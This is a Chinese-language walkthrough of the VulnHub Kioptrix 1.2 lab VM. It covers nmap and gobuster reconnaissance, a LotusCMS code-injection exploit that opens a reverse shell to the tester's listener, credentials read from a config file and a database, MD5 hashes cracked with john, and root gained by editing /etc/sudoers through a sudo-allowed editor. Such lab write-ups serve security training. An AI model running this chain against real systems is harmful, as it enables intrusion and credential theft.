# Kioptrix1.2 主机渗透实现

-   靶机地址：https://www.vulnhub.com/entry/kioptrix-level-12-3,24/
-   下载地址：https://download.vulnhub.com/kioptrix/KVM3.rar



## 信息收集：

### 主机发现

```shell
❯ sudo nmap -sn 192.168.2.1/24
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-08 10:56 HKT
Nmap scan report for 192.168.2.1
Host is up (0.00018s latency).
MAC Address: AA:A1:59:52:23:67 (Unknown)
Nmap scan report for 192.168.2.2
Host is up (0.00018s latency).
MAC Address: 00:50:56:E9:75:CA (VMware)
Nmap scan report for kioptrix3.com (192.168.2.145)
Host is up (0.00039s latency).
MAC Address: 00:0C:29:85:99:55 (VMware)
Nmap scan report for 192.168.2.254
Host is up (0.00019s latency).
MAC Address: 00:50:56:E6:75:62 (VMware)
Nmap scan report for 192.168.2.128
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.01 seconds

```



### 端口扫描

```shell
❯ sudo nmap --min-rate 10000 -p- 192.168.2.145 -oA Nmap-scan/Ports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-08 10:58 HKT
Nmap scan report for kioptrix3.com (192.168.2.145)
Host is up (0.0014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:85:99:55 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 6.20 seconds
```



### 服务及操作系统扫描

```shell
❯ sudo nmap --min-rate 10000 -p 22,80 -sC -sV -O 192.168.2.145 -oA Nmap-scan/sC
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-08 11:00 HKT
Nmap scan report for kioptrix3.com (192.168.2.145)
Host is up (0.00055s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Ligoat Security - Got Goat? Security ...
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
MAC Address: 00:0C:29:85:99:55 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.05 seconds

```



### 基础漏洞扫描

```shell
❯ sudo nmap --script=vuln -p22,80 192.168.2.145 -oA Nmap-scan/Script
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-08 11:02 HKT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for kioptrix3.com (192.168.2.145)
Host is up (0.00073s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-trace: TRACE is enabled
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| http-sql-injection: 
|   Possible sqli for queries:
|     http://kioptrix3.com:80/index.php?page=index%27%20OR%20sqlspider
|     http://kioptrix3.com:80/index.php?system=Admin&page=loginSubmit%27%20OR%20sqlspider
|     http://kioptrix3.com:80/index.php?page=index%27%20OR%20sqlspider
|     http://kioptrix3.com:80/index.php?page=index%27%20OR%20sqlspider
|     http://kioptrix3.com:80/index.php?page=index%27%20OR%20sqlspider
|     http://kioptrix3.com:80/index.php?system=Admin&page=loginSubmit%27%20OR%20sqlspider
|     http://kioptrix3.com:80/index.php?page=index%27%20OR%20sqlspider
|     http://kioptrix3.com:80/index.php?page=index%27%20OR%20sqlspider
|     http://kioptrix3.com:80/index.php?page=index%27%20OR%20sqlspider
|     http://kioptrix3.com:80/index.php?page=index%27%20OR%20sqlspider
|_    http://kioptrix3.com:80/index.php?page=index%27%20OR%20sqlspider
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=kioptrix3.com
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://kioptrix3.com:80/index.php?system=Admin
|     Form id: contactform
|     Form action: index.php?system=Admin&page=loginSubmit
|     
|     Path: http://kioptrix3.com:80/gallery/
|     Form id: 
|     Form action: login.php
|     
|     Path: http://kioptrix3.com:80/index.php?system=Admin&page=loginSubmit
|     Form id: contactform
|     Form action: index.php?system=Admin&page=loginSubmit
|     
|     Path: http://kioptrix3.com:80/index.php?system=Blog&post=1281005380
|     Form id: commentform
|     Form action: 
|     
|     Path: http://kioptrix3.com:80/gallery/
|     Form id: 
|     Form action: login.php
|     
|     Path: http://kioptrix3.com:80/gallery/index.php
|     Form id: 
|     Form action: login.php
|     
|     Path: http://kioptrix3.com:80/gallery/gadmin/
|     Form id: username
|_    Form action: index.php?task=signin
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /phpmyadmin/: phpMyAdmin
|   /cache/: Potentially interesting folder
|   /core/: Potentially interesting folder
|   /icons/: Potentially interesting folder w/ directory listing
|   /modules/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) php/5.2.4-2ubuntu5.6 with suhosin-patch'
|_  /style/: Potentially interesting folder
MAC Address: 00:0C:29:85:99:55 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 345.93 seconds
```





## web信息

-   使用dirb进行web目录扫描

-   ```shell
    ❯ sudo gobuster dir -u http://kioptrix3.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt
    ===============================================================
    Gobuster v3.5
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://kioptrix3.com
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.5
    [+] Timeout:                 10s
    ===============================================================
    2023/06/08 15:40:11 Starting gobuster in directory enumeration mode
    ===============================================================
    /modules              (Status: 301) [Size: 355] [--> http://kioptrix3.com/modules/]
    /gallery              (Status: 301) [Size: 355] [--> http://kioptrix3.com/gallery/]
    /data                 (Status: 403) [Size: 324]
    /core                 (Status: 301) [Size: 352] [--> http://kioptrix3.com/core/]
    /style                (Status: 301) [Size: 353] [--> http://kioptrix3.com/style/]
    /cache                (Status: 301) [Size: 353] [--> http://kioptrix3.com/cache/]
    /phpmyadmin           (Status: 301) [Size: 358] [--> http://kioptrix3.com/phpmyadmin/]
    /server-status        (Status: 403) [Size: 333]
    Progress: 218610 / 220561 (99.12%)
    ===============================================================
    2023/06/08 15:40:51 Finished
    ===============================================================
    ```

-   ![image-20230608111128539](https://raw.githubusercontent.com/r0o983/images/main/image-20230608111128539.png)

-   login页面有明显的cms痕迹

-   ![image-20230608112355539](https://raw.githubusercontent.com/r0o983/images/main/image-20230608112355539.png)

-   根据提示查找对应的exp --> `https://github.com/Hood3dRob1n/LotusCMS-Exploit`

-   使用exp进行测试-> `./lotusRCE.sh http://kioptrix3.com` 根据提示输入端口和IP地址

-   ```shell
    Path found, now to check for vuln....
    
    </html>Hood3dRob1n
    Regex found, site is vulnerable to PHP Code Injection!
    
    About to try and inject reverse shell....
    what IP to use?
    192.168.2.128
    What PORT?
    1234
    
    OK, open your local listener and choose the method for back connect: 
    1) NetCat -e
    2) NetCat /dev/tcp
    3) NetCat Backpipe
    4) NetCat FIFO
    5) Exit
    #? 
    ```

-   主机监听并等待连接。



### 获得初始shell

```shell
❯ sudo nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.2.128] from (UNKNOWN) [192.168.2.145] 44812
whoami
www-data
python -c 'import pty;pty.spawn("/bin/bash")';
www-data@Kioptrix3:/home/www/kioptrix3.com$ clear
clear
TERM environment variable not set.
www-data@Kioptrix3:/home/www/kioptrix3.com$ export TERM=xterm-color
export TERM=xterm-color
www-data@Kioptrix3:/home/www/kioptrix3.com$ whoami
whoami
www-data
www-data@Kioptrix3:/home/www/kioptrix3.com$ echo raw -echo
echo raw -echo
raw -echo
www-data@Kioptrix3:/home/www/kioptrix3.com$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:0c:29:85:99:55 brd ff:ff:ff:ff:ff:ff
    inet 192.168.2.145/24 brd 192.168.2.255 scope global eth1
    inet6 fe80::20c:29ff:fe85:9955/64 scope link 
       valid_lft forever preferred_lft forever
www-data@Kioptrix3:/home/www/kioptrix3.com$   
```

-   查找其他有价值的目录进行信息收集-->找到gallery配置文件中存在数据库的用户密码，使用root账号密码登录ssh

-   ```shell
    www-data@Kioptrix3:/home/www/kioptrix3.com/gallery$ cat gconfig.php
    cat gconfig.php
    <?php
            error_reporting(0);
            /*
                    A sample Gallarific configuration file. You should edit
                    the installer details below and save this file as gconfig.php
                    Do not modify anything else if you don't know what it is.
            */
    
            // Installer Details -----------------------------------------------
    
            // Enter the full HTTP path to your Gallarific folder below,
            // such as http://www.yoursite.com/gallery
            // Do NOT include a trailing forward slash
    
            $GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";
    
            $GLOBALS["gallarific_mysql_server"] = "localhost";
            $GLOBALS["gallarific_mysql_database"] = "gallery";
            $GLOBALS["gallarific_mysql_username"] = "root";
            $GLOBALS["gallarific_mysql_password"] = "fuckeyou";
    
            // Setting Details -------------------------------------------------
    
    if(!$g_mysql_c = @mysql_connect($GLOBALS["gallarific_mysql_server"], $GLOBALS["gallarific_mysql_username"], $GLOBALS["gallarific_mysql_password"])) {
                    echo("A connection to the database couldn't be established: " . mysql_error());
                    die();
    }else {
            if(!$g_mysql_d = @mysql_select_db($GLOBALS["gallarific_mysql_database"], $g_mysql_c)) {
                    echo("The Gallarific database couldn't be opened: " . mysql_error());
                    die();
            }else {
                    $settings=mysql_query("select * from gallarific_settings");
                    if(mysql_num_rows($settings)!=0){
                            while($data=mysql_fetch_array($settings)){
                                    $GLOBALS["{$data['settings_name']}"]=$data['settings_value'];
                            }
                    }
    
            }
    }
    
    ?>
    ```

-   无法使用root权限的ssh进行登录，尝试进去数据库查找其他信息

-   ```shell
    ❯ ssh root@192.168.2.145                                    
    Unable to negotiate with 192.168.2.145 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
    
    ❯ ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss root@192.168.2.145
    The authenticity of host '192.168.2.145 (192.168.2.145)' can't be established.
    RSA key fingerprint is SHA256:NdsBnvaQieyTUKFzPjRpTVK6jDGM/xWwUi46IR/h1jU.
    This key is not known by any other names.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '192.168.2.145' (RSA) to the list of known hosts.
    root@192.168.2.145's password: 
    Permission denied, please try again.
    root@192.168.2.145's password: 
    ```

-   成功登陆数据库：`root:fuckeyou`

-   ```shell
    www-data@Kioptrix3:/home/www/kioptrix3.com/gallery$ mysql -uroot -pfuckeyou
    mysql -uroot -pfuckeyou
    Welcome to the MySQL monitor.  Commands end with ; or \g.
    Your MySQL connection id is 103
    Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)
    
    Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
    
    mysql> show databases;
    show databases;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema | 
    | gallery            | 
    | mysql              | 
    +--------------------+
    3 rows in set (0.00 sec)
    
    mysql> use gallery
    use gallery
    Reading table information for completion of table and column names
    You can turn off this feature to get a quicker startup with -A
    
    Database changed
    mysql> show tables;
    show tables;
    +----------------------+
    | Tables_in_gallery    |
    +----------------------+
    | dev_accounts         | 
    | gallarific_comments  | 
    | gallarific_galleries | 
    | gallarific_photos    | 
    | gallarific_settings  | 
    | gallarific_stats     | 
    | gallarific_users     | 
    +----------------------+
    7 rows in set (0.00 sec)
    
    ```

-   用户表中存在以下信息--> 应该是前端的登陆密码

-   ```sql
    mysql> select * from gallarific_users;  
    select * from gallarific_users;
    +--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+
    | userid | username | password | usertype  | firstname | lastname | email | datejoined | website | issuperuser | photo | joincode |
    +--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+
    |      1 | admin    | n0t7t1k4 | superuser | Super     | User     |       | 1302628616 |         |           1 |       |          | 
    +--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+
    1 row in set (0.00 sec)
    
    ```

-   在dev表中找到两个账号：

-   ```sql
    mysql> desc dev_accounts;
    desc dev_accounts;
    +----------+-------------+------+-----+---------+----------------+
    | Field    | Type        | Null | Key | Default | Extra          |
    +----------+-------------+------+-----+---------+----------------+
    | id       | int(10)     | NO   | PRI | NULL    | auto_increment | 
    | username | varchar(50) | NO   |     | NULL    |                | 
    | password | varchar(50) | NO   |     | NULL    |                | 
    +----------+-------------+------+-----+---------+----------------+
    3 rows in set (0.00 sec)
    
    mysql> select * from dev_accounts;
    select * from dev_accounts;
    +----+------------+----------------------------------+
    | id | username   | password                         |
    +----+------------+----------------------------------+
    |  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 | 
    |  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e | 
    +----+------------+----------------------------------+
    2 rows in set (0.01 sec)
    
    ```

-   将文件内容保存后使用john进行破解

-   ```shell
    ❯ john --format=Raw-MD5 crash --wordlist=/usr/share/wordlists/rockyou.txt
    Using default input encoding: UTF-8
    Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])
    Warning: no OpenMP support for this hash type, consider --fork=4
    Press 'q' or Ctrl-C to abort, almost any other key for status
    starwars         (?)     
    Mast3r           (?)     
    2g 0:00:00:00 DONE (2023-06-08 15:46) 3.030g/s 16414Kp/s 16414Kc/s 16415KC/s Maswhit002..Massingue
    Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
    Session completed. 
    ```

-   连接ssh进行，使用账号密码进行交叉匹配：

-   ```shell
    # dreg : Mast3r
    # loneferret : starwars
    ❯ ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss dreg@192.168.2.145
    dreg@192.168.2.145's password: 
    Permission denied, please try again.
    dreg@192.168.2.145's password: 
    Permission denied, please try again.
    dreg@192.168.2.145's password: 
    Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
    
    The programs included with the Ubuntu system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
    applicable law.
    
    To access official Ubuntu documentation, please visit:
    http://help.ubuntu.com/
    dreg@Kioptrix3:~$ whoami
    dreg
    dreg@Kioptrix3:~$ ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
        link/ether 00:0c:29:85:99:55 brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.145/24 brd 192.168.2.255 scope global eth1
        inet6 fe80::20c:29ff:fe85:9955/64 scope link 
           valid_lft forever preferred_lft forever
    dreg@Kioptrix3:~$ sudo -l
    [sudo] password for dreg: 
    Sorry, user dreg may not run sudo on Kioptrix3.
    dreg@Kioptrix3:~$ cat /etc/crontab 
    # /etc/crontab: system-wide crontab
    # Unlike any other crontab you don't have to run the `crontab'
    # command to install the new version when you edit this file
    # and files in /etc/cron.d. These files also have username fields,
    # that none of the other crontabs do.
    
    SHELL=/bin/sh
    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
    
    # m h dom mon dow user  command
    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    #
    ```



## 提权：

-   使用ssh登陆系统，查找可进行提权利用文件或服务（由于当前已经测试了第一个名为dreg的用户，这次直接使用loneferret进行登陆尝试

-   ```shell
    ❯ ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss loneferret@192.168.2.145
    loneferret@192.168.2.145's password: 
    Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
    
    The programs included with the Ubuntu system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
    applicable law.
    
    To access official Ubuntu documentation, please visit:
    http://help.ubuntu.com/
    Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
    loneferret@Kioptrix3:~$ ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
        link/ether 00:0c:29:85:99:55 brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.145/24 brd 192.168.2.255 scope global eth1
        inet6 fe80::20c:29ff:fe85:9955/64 scope link 
           valid_lft forever preferred_lft forever
    loneferret@Kioptrix3:~$ whoami
    loneferret
    loneferret@Kioptrix3:~$ uname -a
    Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
    loneferret@Kioptrix3:~$ 
    
    ```

-   使用`sudo -l ` 查看可操作的提权文件

-   ```shell
    loneferret@Kioptrix3:~$ sudo -l
    User loneferret may run the following commands on this host:
        (root) NOPASSWD: !/usr/bin/su
        (root) NOPASSWD: /usr/local/bin/ht
    loneferret@Kioptrix3:~$ 
    ```

-   提示可以用root权限来操作ht编辑器而无需输入密码

-   使用`sudo /usr/local/bin/ht`来打开编辑器。使用F3来打开一个需要编辑的文件，这里直接选择操作`/etc/sudoers`文件

-   ![image-20230608161311579](https://raw.githubusercontent.com/r0o983/images/main/image-20230608161311579.png)

-   使用F2保存，F10退出

-   添加一个新的bash环境到当前用户下来进行提权

-   使用`sudo -l`查看新的权限

-   ```shell
    loneferret@Kioptrix3:~$ sudo -l
    User loneferret may run the following commands on this host:
        (root) NOPASSWD: !/usr/bin/su
        (root) NOPASSWD: /usr/local/bin/ht
        (root) NOPASSWD: /bin/bash
    
    ```



### 成功获得root权限

```shell
loneferret@Kioptrix3:~$ sudo /bin/bash
root@Kioptrix3:~# whoami
root
root@Kioptrix3:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:0c:29:85:99:55 brd ff:ff:ff:ff:ff:ff
    inet 192.168.2.145/24 brd 192.168.2.255 scope global eth1
    inet6 fe80::20c:29ff:fe85:9955/64 scope link 
       valid_lft forever preferred_lft forever
root@Kioptrix3:~# cd /root/
root@Kioptrix3:/root# ls -lhai
total 52K
1007617 drwx------  5 root root 4.0K 2011-04-17 08:59 .
      2 drwxr-xr-x 21 root root 4.0K 2011-04-11 16:54 ..
1007620 -rw-------  1 root root    9 2011-04-18 11:49 .bash_history
1007619 -rw-r--r--  1 root root 2.2K 2007-10-20 07:51 .bashrc
1007624 -rw-r--r--  1 root root 1.3K 2011-04-16 08:13 Congrats.txt
 631788 drwxr-xr-x 12 root root  12K 2011-04-16 07:26 ht-2.0.18
1007622 -rw-------  1 root root  963 2011-04-12 19:33 .mysql_history
1007621 -rw-------  1 root root  228 2011-04-18 11:09 .nano_history
1007618 -rw-r--r--  1 root root  141 2007-10-20 07:51 .profile
1007623 drwx------  2 root root 4.0K 2011-04-13 10:06 .ssh
1007626 drwxr-xr-x  3 root root 4.0K 2011-04-15 23:30 .subversion
root@Kioptrix3:/root# cat Congrats.txt 
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.

Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone. 
Difficulty is relative, keep that in mind.

The object is to learn, do some research and have a little (legal)
fun in the process.


I hope you enjoyed this third challenge.

Steven McElrea
aka loneferret
http://www.kioptrix.com


Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.

Main page CMS: 
http://www.lotuscms.org

Gallery application: 
Gallarific 2.1 - Free Version released October 10, 2009
http://www.gallarific.com
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
http://www.exploit-db.com/exploits/15891/

The HT Editor can be found here:
http://hte.sourceforge.net/downloads.html
And the vulnerable version on Exploit-DB here:
http://www.exploit-db.com/exploits/17083/


Also, all pictures were taken from Google Images, so being part of the
public domain I used them.

root@Kioptrix3:/root# 

```



